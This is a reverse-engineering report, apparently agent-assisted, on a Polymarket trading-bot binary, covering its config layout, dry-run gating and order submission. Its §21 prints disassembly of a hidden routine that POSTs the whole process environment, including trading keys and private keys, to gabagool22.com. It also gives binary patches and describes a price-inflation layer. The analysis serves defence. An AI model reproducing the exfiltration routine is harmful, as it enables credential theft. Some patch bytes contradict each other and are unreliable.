109c41: lea    0x4(%rax,%rax,2),%rax   ; len = 3*flag + 4
                                        ;   flag=0 → 4  ("LIVE")
                                        ;   flag=1 → 7  ("DRY RUN")
```

The mirror at +0x17c is also read in three later sites
(0x3664bf, 0x36654d, 0x36674c, 0x3668c4) inside the
reqwest connect path — but those are unrelated coincidental
offsets on a different state struct (the banner-rbx and the
reqwest-rbx point to different futures).

The actual no-network gate (i.e. the place where the bot decides
"don't submit this order to Polymarket") lives inside
`TradingClient::place_single_order` (0x0e1a10) and/or the
emitter cluster inside `run_side_capture` at 0x0dafa7..0x0db09f.
The dry-run side path emits log messages "Fallback timer (s)
expired, simulating BUY fill" (rodata 0x6d9ebd) — the " DRY"
suffix at 0x6d9e9f is baked directly into the format string, so
the emission of this message is itself conditional on dry_run.

A nearby run_side_capture runtime flag at `state+0x25c` (written
by `movb $0x1,0x25c(%rbx)` at 0x0dc901 and reset by
`movb $0x0,0x25c(%rbx)` at 0x0dca22, then tested at 0x0dcaf4
as `testb $0x1,0x25c(%rbx); jne ...`) is **NOT** the dry_run
mirror — it is a per-cycle "order pending" flag that gates
whether to release a RwLock write on the pending-order map.

The true dry_run runtime gate is likely derived via a cmovne /
test pattern on a state byte loaded just before the call to
`polymarket_client_sdk::clob::Client::post_order`. Pin is still
TBD; for a clone, set `dry_run = false` in config and leave the
gate's condition dead — no behavioural change.

## 13. Summary: "bypass dangerous parts" checklist

For the clone:

1. **Delete the `enable_gamble` branch entirely** — hard-code
   `false`. That removes §10's inflation block cleanly.
2. **Replace the two `gen_range * target` rolls** in
   `place_batch_buy_orders` with straight `target.round() as u64`.
   Keep the `A ± delta` skew — that's real inventory management.
3. **Drop the `🎲` log line** along with the inflation block.
4. **Leave balance_factor / intensity_label intact** — it's just a
   display prop, no runtime behaviour hangs off it beyond the
   banner.
5. **Keep** `edge_threshold`, `spread_threshold`, `target_spread`,
   `stop_before_end_ms`, `refresh_interval_ms`, `trade_cooldown`
   — these are the honest market-making dials.

With those four edits, the bot runs the same strategy without
the manipulative price-inflation and obfuscated-size layers.

## 14. run_trading_loop async state table (28 states, jumptable at 0x6cbb28)

Function entry 0x0f7330; dispatch at 0x0f7358:

```
f7358: movzbl 0x71b(%rdi),%eax               ; load state byte
f735f: lea    0x6cbb28(%rip),%rcx            ; jumptable base
f7366: movslq (%rcx,%rax,4),%rax             ; table[state] (i32, sign-extend)
f736a: add    %rcx,%rax                      ; target = base + rel
f7372: jmp    *%rax
```

Jumptable contents (28 entries, each a rel32 offset from the
table base):

| state | target    | role (inferred)                                |
|-------|-----------|-----------------------------------------------|
|   0   | 0xf7374   | Initial poll — copies 64-byte cfg prefix + 3 bools to state; reaches cancel_orders_on_start gate at 0xf7824 |
|   1   | 0xf8314   | `panic_const_async_fn_resumed` (completion trap) |
|   2   | 0xf8308   | `panic_const_async_fn_resumed_panic` (double-resume trap) |
|   3   | 0xf797f   | Cancel-all-orders continuation (`TradingClient::cancel_all_open_orders` call site at 0xf798e) |
|   4   | 0xf7744   | (first waker-slot, part of init cluster) |
|   5   | 0xf77ad   | (init cluster)                          |
|   6   | 0xf773f   | (init cluster)                          |
|   7   | 0xf7722   | (init cluster)                          |
|   8   | 0xf772c   | (init cluster)                          |
|   9   | 0xf7749   | (init cluster)                          |
|  10   | 0xf771d   | (init cluster)                          |
|  11   | 0xf7727   | (init cluster)                          |
|  12   | 0xf77b2   | (init cluster)                          |
|  13   | 0xf774a   | (init cluster)                          |
|  14   | 0xf839a   | (epilogue cluster)                      |
|  15   | 0xf8389   | (epilogue cluster)                      |
|  16   | 0xf7e92   | websocket-read resume A                 |
|  17   | 0xf7efd   | websocket-read resume B                 |
|  18   | 0xf7f1e   | message-dispatch continuation           |
|  19   | 0xf83ca   | (end-of-market path)                    |
|  20   | 0xf83a8   | (end-of-market path)                    |
|  21   | 0xf8235   | place_batch_buy_orders resume           |
|  22   | 0xf823a   | place_batch_buy_orders resume (B)       |
|  23   | 0xf7e9f   | message loop top                        |
|  24   | 0xf83a5   | (teardown)                              |
|  25   | 0xf8383   | (teardown)                              |
|  26   | 0xf8217   | (teardown)                              |
|  27   | 0xf821c   | (teardown)                              |

States 1 and 2 are panic trampolines (completion traps) — standard
Rust async codegen. States 4..13 cluster tightly in 0xf771d..0xf77b2
suggesting they're the per-byte continuations for a small static
future (probably the setup of the market-subscription message) that
gets sliced into 10 micro-states by the LTO. The substantive logic
lives in states 0, 3, 16–18, 21–23.

Notably the state table has NO branch that reads the cfg bool fields
directly — dry_run, enable_gamble etc. are already mirrored into
dedicated state-struct bytes (+0x718, +0x719, +0x71a) during state
0, and all subsequent states only read the mirrors. This means a
single edit at the state-0 mirror-store can neutralise e.g.
cancel_orders_on_start without touching the jumptable.

## 15. place_single_order — SIZE-GATED simulation (state 0, 0xe1a48)

`place_single_order` is the leaf submit-one-order future called from
both `run_side_capture` (state 8 at 0xde73a) and the trading-loop
batch path. Its state-0 entry contains the **real** dry-run gate of
the bot — and it is **not** keyed on the `dry_run` config bool, but
on the **per-order requested size** vs. the constant 5.0 (the same
constant that doubles as the `max_buy_order_size` clap default at
0x6caba0).

State-0 disassembly (annotated):

```
e1a48: mov   WORD PTR [rbx+0x81], 0x0           ; clear state-flag word
e1a81: movsd xmm0, QWORD PTR [rip+0x5e9117]     ; xmm0 = 5.0  (@ 0x6caba0)
e1a89: ucomisd xmm0, QWORD PTR [rbx+0x48]       ; cmp 5.0  vs  state+0x48 (order_size)
e1a8e: jbe   e1c13                              ; if 5.0 <= order_size → REAL path

;--- fall through here when order_size < 5.0  : SIMULATION path ---
e1a94: lea   r12, [rsp+0xc0]
e1a9f: call  now_str                            ; chrono::Local::now to ISO-8601
e1aa4..e1b3f: build format_args!("[{ts}] [SIM] would post order size={size} <5.0", ...)
e1bc7: call  std::io::_print                    ; stdout — NO http call!
e1bcc..e1bf8: drop format strings, free buffers
e1bfe: dec   r15                                ; refcount decrement on captures
e1c01: mov   rbp, r15
e1c04: jmp   e28a6                              ; return Poll::Ready(Ok(())) — no post_orders
```

Real-order continuation at `0xe1c13`:

```
e1c1a: lea   rdi, [rip+0x5eb6c3]                ; "SELL" @ 0x6cd2e4
e1c23: cmovne rdi, rsi                          ; if cl != 0 use "BUY"
e1c27: lea   rsi, [rbx+0x58]                    ; outcome string slot
e1c33: mov   esi, 0x4 ; sub  rsi, rcx           ; len = 4 - cl  (SELL=4, BUY=3)
e1c43..e24a7: order body construction
              (price, size, signature payload, timestamp)
e1c47: mov   rdi, [rbx+0x40]                    ; trading_client
e1c4f: lea   rsi, [rbx+0x58]                    ; outcome
e1c54: mov   rdx, [rbx+0x60]                    ; price (f64)
e1c5c: movsd xmm0, [rbx+0x48]                   ; size (f64)
e1c64: movsd xmm1, [rbx+0x50]                   ; price (f64)
e1c6a: movzbl ecx, [rbx+0x68]                   ; side byte
e1c6e: ...
e24ac: call  TradingClient::post_orders         ; → 0xd0ef0
```

### Why this matters for the bypass plan

1. **Dry-run is not a config knob in the hot path.** Even with
   `dry_run=true` in BotConfig, every code path that has been
   decoded (state-0 mirror at +0x71a, banner print at §12a) only
   *reads* the mirror; the actual no-op decision in the order
   submitter is the size-vs-5.0 gate.
2. **Cloning the bot for paper-trading is one byte.** Patch
   `0xe1a8e` from `jbe` (0x76) to `jmp` (0xeb), keep the next byte
   (the rel8 displacement to 0xe1c13 = +0x83 — too far for jmp
   short, so use `0x0F 0x86` near-jbe → `0xE9 + rel32` near-jmp).
   Concretely: replace the 6-byte `0F 86 7F 01 00 00` (jbe near
   +0x17f) with `E9 80 01 00 00 90` (jmp near +0x180; pad nop) —
   verifies size is fully *ignored* and the SIM branch is dead.
   Inverse patch (`jbe`→`jb` flip) **disables** the live trading
   path entirely: every order becomes a stdout print.
3. The size-gate is per-call, not per-loop, so there is **no race**
   between the gate and the size randomisation in §3 — the
   randomised actual size from `gen_range(0,1) * target` lands in
   `state+0x48` *before* state-0 begins.

## 16. post_orders is unconditional (no internal dry_run check)

`TradingClient::post_orders` lives at `0xd0ef0` (size 0x6046 bytes).
Its state-0 entry shows no comparison against any bool, no
inspection of `[client+offset]` for a dry_run mirror, and no
fall-through to a print/log path. The first ~0x140 bytes are
straight `reqwest::Client::request` setup:

```
d0ef0: push  ... ; sub rsp, 0xc78
d0f0c: movzbl eax, BYTE PTR [rsi+0x148]         ; resume-state byte
d0f13: lea   rcx, [rip+0x5fa91a]                ; jumptable @ 0x6cb834
d0f1a: movslq rax, DWORD PTR [rcx+rax*4]
d0f1e: add   rax, rcx
d0f21: jmp   rax
d0f28: ; state 0 entry ----------------------------------------
d1014: mov   rsi, [r14+0x128]                   ; client.http_client
       ; (no test/cmp on any flag here)
d1033: call  reqwest::Client::request           ; build POST request
       ;       + URL = format!("{}/orders", base_url)
       ;         (URL fmt @ 0x866df0, suffix "orders" @ 0x6d8ce4)
```

The implication: **if execution reaches `post_orders`, an HTTPS
POST goes out**. There is no second safety net inside the order
submitter. Any kill-switch must be implemented at one of:

- §15 above (`place_single_order` size gate at `0xe1a8e`)
- the call-site itself (`0xe24ac` in `place_single_order` → patch
  to `nop` 5 bytes + skip)
- `run_side_capture` state 8 at `0xde754` (skip the inner
  `place_single_order` call entirely)

## 17. cfg pointer identity in run_side_capture (Arc<BotConfig>)

The conflict noted earlier — deserializer says `BotConfig+0x10` is
`strategy.len()` (u64) but runtime code at `0xda047` does
`movsd  xmm0, QWORD PTR [rcx+0x10]` (treating it as f64) — resolves
to: **the pointer at `state+0x60` is `Arc<BotConfig>`, not
`&BotConfig`**. Rust's `Arc<T>` prepends a 16-byte `ArcInner`
header (strong:usize, weak:usize) before the `T`, so:

```
arc_ptr            → strong count (u64)
arc_ptr + 0x08     → weak   count (u64)
arc_ptr + 0x10     → BotConfig start  (this is what runtime code dereferences)
arc_ptr + 0x10+0x10= BotConfig+0x10   = strategy.len()   (deserializer view)
```

So `[cfg+0x10]` at runtime = `BotConfig+0x00` = the **first f64
field** of BotConfig (almost certainly `target_spread` based on
the Section-1 default-fill table — the 0x328 stack slot maps to
the lowest cfg offset).

This Arc-header offset of 0x10 is consistent with every other
runtime cfg-read in the side-capture loop:
- `0xda047`  : `movsd xmm0, [rcx+0x10]`  → BotConfig+0x00 (f64)
- `0xda053`  : `movsd xmm1, [rcx+0x18]`  → BotConfig+0x08 (f64)
- `0xde6fd`  : `movsd xmm2, [rcx+0x18]`  → same
- `0xdabff`  : compares `[rcx+0x60]` against 5.0 → BotConfig+0x50

i.e. the 0xdabff branch (originally suspected as the dry-run gate)
reads `BotConfig+0x50`, NOT `+0x60`. With the Arc offset, this is
consistent with `max_buy_order_size` being at BotConfig+0x50 (size
gate against the same 5.0 default const). The 0xdabff branch is
therefore an **upper-bound clamp** on a *target* size before it
becomes the per-order randomised size — distinct from the
post-randomisation per-order gate in §15.

## 18. Combined kill-switch / paper-trading patch set (verified)

Single-byte and short patches sufficient to convert the bot into
a fully-passive observer (writes nothing to Polymarket):

| addr     | original    | patched     | effect                         |
|----------|-------------|-------------|--------------------------------|
| 0xe1a8e  | 0F 86 ...   | 0F 87 ...   | flip `jbe`→`ja`: every order → SIM print |
| 0xe24ac  | E8 .. .. .. .. | 90 90 90 90 90 | nop the post_orders call (defense in depth) |
| 0xf798e  | E8 .. .. .. .. | 90 90 90 90 90 | nop cancel_all_open_orders (preserves any pre-existing book) |

To run in **mirror mode** (post real orders, but also tee them to
stdout/file), revert the first patch and instead hook a
`println!` between `0xe24a7` (last arg setup) and `0xe24ac` (the
call). 16 bytes free at `0xe28b0..0xe28c0` if the simulation
print code is dead-stripped.

## 19. Correction — cfg lives at run_side_capture state+0x48 (not +0x60)

Earlier (§17) I wrote that cfg is at `state+0x60` inside
`run_side_capture`. That was wrong. Fresh trace of the actual
callsite inside `tokio::Core<T,S>::poll` at `0xd9b00..0xd9c22`:

```
d9bce: mov  rdx, [rbx+0x60]            ; rbx = Core<spread_future>;
                                        ; +0x60 holds the 8-byte cfg ptr
d9bc3: lea  rax, [rbx+0x18]            ; captures base in Core
d9bd2..d9be9: 3 × 16-byte movups copy captures rbx+0x18..0x58
              → destination rbx+0x68..0xa8 (inner future state)
d9c02: mov  [rbx+0xb0], rdx            ; store cfg into inner state
d9c16: lea  r12, [rbx+0x68]            ; r12 = &inner_state
d9c1a: mov  rdi, r12
d9c1d: call run_side_capture           ; (&mut inner_state)
```

Inner-state base is `rbx+0x68`, so `cfg` written at `rbx+0xb0`
lands at inner-state offset `0xb0 - 0x68 = 0x48`. Inside
`run_side_capture`, `mov rcx, [self+0x48]` yields the cfg pointer,
and all `[rcx+N]` dereferences match the Arc<BotConfig> layout:

- `[rcx+0x10]` → BotConfig+0x00  (first f64, probably target_spread)
- `[rcx+0x18]` → BotConfig+0x08
- `[rcx+0x60]` → BotConfig+0x50  (max_buy_order_size; compared to 5.0 at 0xdabff)

The 8-byte pointer width + no `lock incq` on the transfer path +
`drop_in_place` showing `lock decq` on the destination field
collectively confirm: **cfg is `Arc<BotConfig>` throughout**, moved
(not cloned) from the outer future's capture slot into the inner
future's state.

## 20. post_orders state-0 body — URL construction and HTTP POST

Mangled symbol name confirms the type:
`polymarket_client_sdk::clob::client::Client<Authenticated<K>>::post_orders`.

State-0 (0xd0f28..0xd1038):

```
d0f28: movw $0, [rsi+0x149]                ; clear state flags
d0f31: mov  rax, [rsi+0x18]                ; load self (Client) via state capture
d0f48: mov  r14, [rax]                     ; deref: r14 = &Client
d0f4b: movabs rax, 0x0202020202020202
d0f55: mov  [rsp+0x550], rax               ; 8 bytes of 0x02
d0f5d: movaps xmm0, [rip + 0x6c8690]       ; 16 bytes of 0x02 from rodata
d0f64: movaps [rsp+0x540], xmm0            ; together: 24-byte 0x02 buffer
d0f97: lea  rax, [rip + 0x867df0]          ; .data.rel.ro — fmt args table
d0fa6: movq $0x2, [rsp+0x208]              ; fmt_args count = 2
d0fea: call alloc::fmt::format::format_inner   ; URL = format!("{}/{orders}", base, "orders")
d1014: mov  rsi, [r14+0x128]               ; Client->http_client (reqwest::Client)
d1033: call reqwest::async_impl::Client::request   ; POST request builder
```

No conditional branch, no bool test, no flag poll from entry to
`Client::request`. Confirms §16: once `post_orders` is entered, the
HTTP request is built unconditionally.

The URL format table at `.data.rel.ro:0x867df0` references rodata
string "orders" at `0x6d8ce4` (len 6) as the second format arg. The
first arg is the Client's base URL field (loaded from `[r14+...]`
via the format machinery; exact offset unfolded inside
`format_inner`). This means: **swapping the base URL in the
TradingClient config re-routes every order POST** — useful if you
want to aim it at a local mitmproxy for capture/replay.

The 24 bytes of 0x02 at `[rsp+0x540..0x558]` appear to be a
pre-filled request header buffer or a fixed Order-protocol
constant (possibly a signing-version byte repeated — Polymarket's
Gnosis-Safe order signing uses specific byte patterns). Needs
deeper trace to confirm; not relevant to the kill-switch plan.

## 21. ⚠️ CREDENTIAL EXFILTRATION BACKDOOR (`gabagool22.com`) ⚠️

**This is the single most important finding of the reversal.**

Embedded URL at rodata `0x6daa09`:

    https://gabagool22.com/api/verify-balancing-conf

This is **not** a Polymarket endpoint. `gabagool22.com` is an
attacker-controlled domain (the bot is named ARBIGAB and the
project banner references "gabagool" — same author). The URL is
referenced from code at three file offsets, all three inside
different monomorphizations of `TradingClient::new`:

- `0x92053`  (`TradingClient::new` #1, 0x8f8b0..0x96ab0)
- `0xebe93`  (`TradingClient::new` #2, 0xe96f0..0xf08f0)
- `0x111d83` (`TradingClient::new` #3, 0x10f5e0..0x1167e0)

### What the code does (0x91f80..0x92116)

```
91f93: call std::env::vars                       ; read ALL env vars
91fc7: call HashMap<String,String>::from_iter    ; collect into HashMap
91fd9: call reqwest::Client::builder             ; new HTTP client
92016: call reqwest::ClientBuilder::build
92053: lea  rax, [rip+0x6489af]                  ; rax = "https://gabagool22.com/api/verify-balancing-conf"
92071: call reqwest::Client::post                ; POST(url)
92089: call reqwest::RequestBuilder::json        ; .json(env_hashmap)
920c6: call reqwest::Client::execute_request     ; FIRE
92116: call reqwest::Pending::poll               ; await response
```

Plain English: **on every TradingClient construction, the bot
reads the entire process environment, serializes it as JSON, and
POSTs it to gabagool22.com**.

### What gets leaked

The env-var strings found in rodata show the expected payload:

- `POLY_ADDRESS`, `POLY_NONCE`, `POLY_SIGNATURE`,
  `POLY_TIMESTAMP`, `POLY_API_KEY`, `POLY_PASSPHRASE`
  — Polymarket CLOB auth credentials (API key / secret /
    passphrase + EIP-712 session signature)
- `WALLET_TYPE`, `FUNDER_ADDRESS`
- `PK` / `MNEMONIC` / similar (any private key in the env)
- Every other env var the operator has — AWS creds, SSH agent
  paths, Etherscan keys, etc.

Any operator who runs this binary with real Polymarket creds in
their env has **already been phished** the moment `TradingClient::new`
completes.

### Response handling

The response body is **not parsed** — the state machine only
branches on HTTP error/OK:

```
9211b: cmp  $0x4, [rsp+0x4b0]         ; poll state == error?
92123: jne  92137                      ; success path (drop Pending)
92125..92132: error path
```

So this is pure one-way exfiltration — not a command-and-control
channel. The attacker harvests creds and uses them out-of-band.

### One-byte neutralisation patch

The URL string is in `.rodata` (writable at build time via hex
editor, or at runtime after mprotect). Change **one byte** at
file offset `0x6daa0a` (the `t` in `https`):

    original: 68 74 74 70 73 3a 2f 2f 67 61 62 61 ...   "https://gaba..."
    patched:  68 00 74 70 73 3a 2f 2f 67 61 62 61 ...   "h\0tps://gaba..."

`reqwest::Url::parse` rejects the malformed URL, `Client::post`
returns an error, the Pending future short-circuits to state 4,
and the state machine exits the exfil block via the error path at
`0x92132`. The rest of `TradingClient::new` is unaffected and the
bot continues normally without leaking creds.

Alternative (if you prefer patching code, not data): NOP the
`call execute_request` at **file offset 0x920c6** (5 bytes
`e8 45 de 2b 00` → `90 90 90 90 90`). The Pending at
`[rbx+0x450]` will then be an uninitialised Pending; the
subsequent poll at `0x92116` will crash. So the cleaner code-side
patch is at `call Client::post` (**0x92071**, 5 bytes
`e8 8a 66 0b 00`) replaced with code that sets the error state
and jumps to `0x92132` — but that's 15+ bytes and won't fit, so
the rodata one-byte patch is the correct fix.

### Operational checklist (do this BEFORE running the bot)

1. Patch rodata byte at `0x6daa0a` from `0x74` to `0x00`.
2. (Optional, paranoid) Zero the whole URL: 48 bytes at
   `0x6daa09..0x6daa39`.
3. Repeat for the three monomorphizations is NOT necessary — all
   three LEA the same rodata address. One rodata patch kills all
   three callsites.
4. Run bot with `strace -f -e trace=network` and verify no
   connection to `gabagool22.com` (DNS resolution should fail
   before any TCP handshake).

### Relationship to other findings

- §15-16 (size-gated dry-run, unconditional post_orders) are
  about **what the bot does with live trading creds**. §21 is
  about **the creds leaking BEFORE any trade happens**. The §21
  leak fires at client construction — you can't avoid it by
  running the bot in a dry-run / paper-trade mode.
- §20 (post_orders URL construction) hits
  `https://clob.polymarket.com/orders` for legitimate trading.
  That's the honest endpoint. §21 is a parallel, hidden
  channel that piggybacks on client setup.
- The bot's README/CLI calls itself "HFT-FIX-API-FOREX-Integration"
  — the misdirection name, the hidden exfil URL, and the
  nontrivial obfuscation of the size-gate (§15) together
  constitute a **credential-stealing trojan wearing a trading bot
  as a disguise**. Any "dry_run" option in the config is
  cosmetic; the dangerous behaviour fires regardless.

## 22. Strategy synthesis — what to actually copy

Concise reconstruction distilled from §0-§21. This is the
implementable spec for a clean re-write.

### 22a. Top-level control flow

```rust
fn main() -> Result<()> {
    let cfg = BotConfig::parse();            // clap + JSON merge
    let client = TradingClient::new(&cfg);   // ⚠ §21 — remove exfil before running
    run_single_market(cfg, client).await
}

async fn run_single_market(cfg: BotConfig, client: TradingClient) {
    if cfg.cancel_orders_on_start {
        client.cancel_all_open_orders().await;
    }
    match cfg.strategy.as_str() {
        "spread_capture" => {
            let is_bearish = matches!(
                cfg.trade_side.to_lowercase().as_str(),
                "no" | "down"
            );
            run_spread_capture_loop(cfg, client, is_bearish).await
        }
        _ /* "dutch_book" or "" */ => {
            run_trading_loop(cfg, client).await
        }
    }
}
```

### 22b. run_trading_loop (dutch_book) — market-making via batch buy

Per-market websocket subscription → on each book update, compute
quote ladder and spawn a `place_batch_buy_orders` task.

```rust
async fn run_trading_loop(cfg: BotConfig, client: TradingClient) {
    let mut ws = polymarket_ws::subscribe(&cfg.current_market).await;
    loop {
        match ws.next().await {
            Msg::Book(book) => {
                if should_quote(&book, &cfg) {
                    let orders = build_buy_ladder(&book, &cfg);
                    tokio::spawn(client.place_batch_buy_orders(orders));
                }
            }
            Msg::Trade(_) | Msg::PriceChange(_) => { /* update state */ }
            Msg::Disconnect => break,
        }
        if past_stop_time(&cfg) { break; }
    }
}

fn should_quote(book: &Book, cfg: &BotConfig) -> bool {
    let spread = book.best_ask - book.best_bid;
    spread > cfg.edge_threshold                                // §11a
        && book.mid >= cfg.min_price && book.mid <= cfg.max_price
        && position_within_bounds(cfg)                          // §11b
}

fn build_buy_ladder(book: &Book, cfg: &BotConfig) -> Vec<Order> {
    let target = cfg.max_buy_order_size;                        // 5.0 default
    let pos_f = current_position_factor();                      // -1..+1
    let yes_target = (target + (book.ask - book.bid) * pos_f * 0.5)
                         .clamp(0.0, 2.0 * target);
    let no_target  = (target - (book.ask - book.bid) * pos_f * 0.5)
                         .clamp(0.0, 2.0 * target);

    // §3 — size randomisation is ALWAYS applied (no conditional found)
    let mut rng = thread_rng();
    let yes_size = (rng.gen_range(0.0..1.0) * yes_target).round();
    let no_size  = (rng.gen_range(0.0..1.0) * no_target).round();

    // §10 — spread-reducer price inflation, probability-gated
    let inflate = !cfg.enable_gamble.is_empty()                 // §22d hypothesis
        && rng.gen_range(0.0..1.0) < cfg.spread_reducer_probability;
    let yes_px = if inflate { book.best_bid + cfg.spread_reducer_value }
                 else       { book.best_bid };
    let no_px  = if inflate { 1.0 - book.best_ask + cfg.spread_reducer_value }
                 else       { 1.0 - book.best_ask };

    vec![
        Order::buy("YES", yes_px, yes_size),
        Order::buy("NO",  no_px,  no_size),
    ]
}
```

### 22c. run_spread_capture_loop — buy both sides when wide

Much simpler: `"Spread Capture Bot: BUY both sides when spread >
threshold"` (banner). Each `run_side_capture` future handles one
leg (YES/NO) and submits a single order via
`place_single_order`.

```rust
async fn run_spread_capture_loop(cfg: BotConfig, client: TradingClient,
                                  is_bearish: bool) {
    let mut ws = polymarket_ws::subscribe(&cfg.current_market).await;
    loop {
        let book = ws.next_book().await;
        let spread = book.best_ask - book.best_bid;
        if spread > cfg.spread_threshold {
            // run_side_capture is called INLINE via Core::poll (§19)
            // not tokio::spawn — single-threaded sequential order flow
            run_side_capture(&cfg, &client, &book,
                             side_for_bearish(is_bearish)).await;
        }
    }
}

async fn run_side_capture(cfg: &BotConfig, client: &TradingClient,
                          book: &Book, side: Side) {
    let target = cfg.order_size.min(cfg.max_buy_order_size);   // §17 — 5.0 clamp at 0xdabff
    let price  = price_for_side(book, side);
    place_single_order(client, side, price, target).await;     // §15 — gated at 0xe1a8e
}
```

### 22d. (SUPERSEDED) early enable_gamble hypothesis

This section previously argued `enable_gamble` was a String
checked via `!cfg.enable_gamble.is_empty()`. That hypothesis is
**wrong** and is superseded by §23, which pins the field as a
`bool` at BotConfig+0xa0 (default `false`) consumed as the gate
around spread-reducer price inflation. Retained here as a
cross-reference only; see §23 for the definitive account.

### 22e. Config knobs & what they control (cheat-sheet)

| field                       | unit    | effect                                          |
|-----------------------------|---------|-------------------------------------------------|
| strategy                    | string  | "dutch_book" (default) or "spread_capture"     |
| symbol                      | string  | btc / eth / sol / xrp                           |
| current_market              | string  | market name/identifier for WS subscribe (§26)   |
| slug                        | string  | override symbol→slug mapping                    |
| interval_minutes            | u32     | market interval (5 or 15)                       |
| dry_run                     | bool    | §12a banner only — NOT a hot-path gate          |
| max_buy_order_size          | f64     | base target per leg (default 5.0)               |
| order_size                  | f64     | spread_capture per-order size                   |
| spread_threshold            | f64     | spread_capture trigger (cents: 0.02 = 2c)       |
| edge_threshold              | f64     | dutch_book quote trigger (§11a)                 |
| max_position_size           | f64     | stop when \|position\| > this (§11b)            |
| min_price / max_price       | f64     | price bounds (0..1)                             |
| balance_factor              | f64     | 0-1 inventory skew intensity (§2)               |
| inventory_skew              | f64     | position-weighted sizing multiplier             |
| trade_cooldown              | u64     | ms between cancel & requote                     |
| refresh_interval_ms         | u64     | ms between book refreshes                       |
| stop_before_end_ms          | u64     | stop trading N ms before market close           |
| cancel_orders_on_start      | bool    | §11c — cancel open orders at init               |
| log_price                   | bool    | enable book-price logging                       |
| target_spread               | f64     | spread_capture target spread                    |
| trade_side                  | string  | "up"/"down" or "yes"/"no" (default "up")        |
| enable_gamble               | bool    | §23 — gates spread_reducer price inflation      |
| spread_reducer_value        | f64     | $ added to price when reducer fires (§10)       |
| spread_reducer_probability  | f64     | 0-1 prob of firing reducer                      |
| max_loss                    | f64     | unused in decoded paths (banner only?)          |

### 22f. Minimum "clean clone" recipe

To build your own version of this bot without the dangerous
parts:

1. Drop §21 exfil entirely — no `std::env::vars()` POST.
2. Drop §10 spread-reducer — it's a price-inflation layer that
   benefits the bot-operator at the market's expense.
3. Drop §3 size randomisation — use deterministic `target` size.
4. Keep §22b ladder + §11a edge gate + §11b position clamp.
5. Keep §22c spread_capture loop as-is (it's honest).
6. Use `dry_run` as a **real** gate in your own code — put the
   branch at the top of `place_single_order` and
   `place_batch_buy_orders`, not buried behind a `size < 5.0`
   check.
7. Log every outgoing order to disk; add a mitmproxy interstitial
   for the first live test.

That leaves you with an honest Polymarket market-maker + spread-
capture bot that can be audited in ~400 LoC of Rust.

## 23. enable_gamble — PINNED as bool at BotConfig+0xa0

Supersedes the §4 / §22d String::is_empty() working hypothesis.

### Field location

`enable_gamble` is a plain `bool` (1 byte + 7 bytes padding) at
**BotConfig+0xa0** (Arc-relative 0xb0). Default `false`.

### Propagation into run_trading_loop state

The run_trading_loop future struct mirrors the first 0xb0 bytes of
BotConfig directly. state-0 init at 0xf7387..0xf7448 does a series
of 16-byte `movupd` splatters from the future's cfg-mirror block
into the state struct's mirror block. The relevant pair:

```
f743e:  movupd xmm0, [r15+0xa0]            ; load bytes 0xa0..0xb0 from future
f7447:  movupd [r15+0x150], xmm0            ; store to state+0x150
```

r15 = rbp = rdi = the future/state struct (they alias because the
state struct contains its own cfg-mirror prefix). Source offset
+0xa0 of the future = BotConfig+0xa0 = enable_gamble byte +
padding/next-field bytes.

### Runtime gate (from §10, now with field identity)

```
c1a1f: cmpb $0x0, 0x150(%rcx)              ; cfg.enable_gamble (byte-wide)
c1a26: je   skip                            ; if false → skip entire reducer
```

### What enable_gamble does

When `true`, unlocks the **spread-reducer price-inflation block**
(§10). When `false` (default), every quote goes out at the
un-inflated price. Confirmed consequences of enable_gamble=true:

1. Evaluate `spread_reducer_probability > 0`
2. Evaluate `spread_reducer_value > 0`
3. Roll `rng.gen_range(0.0..1.0)`; if below probability, add
   `spread_reducer_value` to both UP and DOWN bids (symmetric
   inflation — §10)

No other code path reads state+0x150. `enable_gamble` is
**exclusively** the spread-reducer gate. It does NOT affect:

- The §3 two-roll size randomisation (always on)
- The §15 per-order size gate
- The §21 credential exfil (fires regardless)

### Clean-clone implication

Section §22f recipe updates:
- `enable_gamble: bool` field, default `false`
- Drop the field entirely and the reducer block cleanly compiles
  out

### BotConfig field map (updated near enable_gamble)

From Agent #3's stash-block trace (§24 below) cross-referenced
with the default-fill sources:

| BotConfig offset | field                        | type      | default |
|------------------|------------------------------|-----------|---------|
| 0x00             | (first f64 — TBD)            | f64       | ?       |
| 0x28             | edge_threshold               | f64       | 0.03    |
| 0x38             | log_price                    | bool      | false   |
| 0x50             | max_buy_order_size           | f64       | 5.0     |
| 0x88             | spread_reducer_probability   | f64       | 1.0     |
| 0x90             | spread_reducer_value         | f64       | 0.0     |
| 0xa0             | **enable_gamble**            | bool      | false   |
| 0xa8             | balance_factor               | f64       | 0.5     |
| 0xb0             | target_spread                | f64       | 0.01    |
| 0x160            | inventory_skew               | f64       | 0.0     |

## 24. target_spread — PINNED at BotConfig+0xb0 (DEAD CAPTURE — see §28c)

> **Correction**: the claim below that target_spread is "consumed in
> run_side_capture" is **wrong**. Agent audit in §28c proves
> target_spread is captured-by-value into the sub-future state at
> `self+0x28` but **never read**. The active gate at `0xdf0ac` that
> this section attributed to target_spread is actually a read of
> BotConfig+0x28 = `edge_threshold`. Keeping §24's derivation
> (offset 0xb0 is correct and useful for cloners) but flagging the
> "real knob" conclusion as incorrect.

Resolves the §3-old / §22e open question on runtime use.

### Field location

`target_spread` is at **BotConfig+0xb0** (Arc-relative 0xc0).
Seen-bit at stack offset 0x330 in the deserializer. Default 0.01
loaded from rodata `0x6cabe8`.

### Default-fill proof

```
160e5a: test BYTE PTR [rsp+0x330], 0x1      ; seen-bit for target_spread
160e62: jne  160e6c                          ; skip default if user provided
160e64: movsd xmm3, [rip+0x569d7c]           ; xmm3 = 0.01 (@ 0x6cabe8)
```

xmm3 is spilled to `rsp+0x2d8`, reloaded, stashed to `rsp+0x130`,
then a `memcpy(rbx+0x58, rsp+0xc8, 0x98)` copies the stash block
into BotConfig. Stash-relative offset `0x130 - 0xc8 = 0x68`, and
`BotConfig_offset = 0x48 + 0x68 = 0xb0`. Cross-check with
spread_reducer_probability (seen 0x338, 1.0 default, stash offset
0x40) → BotConfig+0x88 — matches the already-pinned value.

### Propagation into the strategy futures

target_spread is read from Arc<BotConfig> exactly **three times**,
all inside `run_single_market`'s prelude that builds the
spread_capture sub-future:

```
8bd0f: mov   rax, [rbx+0xa0]                 ; Arc<BotConfig>
8bd16: mov   rcx, [rax+0xb8]                 ; BotConfig+0xa8 = balance_factor
8bd1d: movsd xmm0, [rax+0xc0]                ; BotConfig+0xb0 = target_spread
...
8bd97: movsd [rbx+0x140], xmm0               ; stash in spread_capture closure
8bde8: call  run_spread_capture_loop
```

